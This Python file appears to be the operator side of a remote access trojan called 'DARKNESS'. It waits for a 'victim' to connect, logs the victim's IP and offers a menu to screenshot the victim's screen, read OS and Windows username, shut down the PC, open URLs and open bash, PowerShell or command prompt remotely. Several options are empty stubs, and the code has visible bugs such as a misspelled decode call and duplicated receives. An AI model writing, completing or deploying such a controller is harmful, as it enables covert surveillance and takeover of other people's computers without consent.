import socket
import chalk
import os
from typing import *
import logging
import sys
logging.basicConfig(filename="logs.log",level=logging.INFO,format="[%(asctime)s] %(levelname)s - %(message)s",datefmt="%H:%M:%S")
class Server():
    def __init__(self,c:socket.socket,addr:Tuple[str,int]) -> None:
        self.c=c
        choices=[i for i in range(1,9)]
        print(chalk.red(f"SUCCESSFULLY ESTABLISHED A CONNECTION WITH VICTIM. VICTIM'S IP : {addr}"))
        logging.info(f"SUCCESSFULLY ESTABLISHED A CONNECTION WITH VICTIM. VICTIM'S IP : {addr}")
        msg="""
        ============================== D A R K N E S S ==============================
        MAKE YOUR VICTIM CRY :
        1.) SCREENSHOT VICTIM'S WINDOW
        2.) GET VICTIM'S OS NAME
        3.) GET VICTIM'S WINDOWS USERNAME
        4.) SHUTDOWN VICTIM'S PC
        5.) OPEN URL IN VICTIM'S BROWSER
        6.) OPEN VICTIM'S BASH
        7.) OPEN VICTIM'S POWERSHELL
        8.) OPEN VICTIM'S COMMAND PROMPT
        """
        print(chalk.red(msg))
        choice=input(chalk.red("CHOOSE AN OPTION : "))
        choice=int(choice)
        while choice not in choices:
            print(chalk.red("\nCHOOSE AN APPROPRIATE OPTION!\n"))
            choice=int(input(chalk.red("CHOOSE AN OPTION : ")))
        else:
            # Screenshot
            if choice==1:
                # Screenshot Functionality Isn't Working
                self.c.send("screenshot".encode())
                print(self.c.recv(1024))
            # Operating System Name
            elif choice==2:
                self.c.send("os_name".encode())
                print(self.c.recv(4096).decode())
                logging.debug(self.c.recv(4096).decode())
            # Windows Username
            elif choice==3:
                self.c.send("windows_username".encode())
                print(self.c.recv(4096).decode())
                logging.debug(self.c.recv(4096).decode())
            # Shutdown PC
            elif choice==4:
                self.c.send("shutdown_pc".encode())
                print(self.c.recv(4096).deocde())
                logging.debug(self.c.recv(4096).decode())
            # Open URL
            elif choice==5:...
            elif choice==6:...
            elif choice==7:...
    @staticmethod
    def init_socket(_addr:str,_port:int) -> Tuple[socket.socket,Tuple[str,int]]:
        s=socket.socket()
        s.bind((_addr,_port))
        s.listen()
        logging.info(f"STARTED SERVING AT ADDRESS {_addr} AND PORT {_port}")
        print(chalk.red("============================== D A R K N E S S =============================="))
        print(chalk.red("WAITING FOR VICTIM TO CONNECT..."))
        c,addr=s.accept()
        if sys.platform=="win32":
            os.system("cls")
        else:
            os.system("clear")
        return (c,addr)
if __name__ == "__main__":
    c,addr=Server.init_socket("localhost",9999)
    server=Server(c,addr)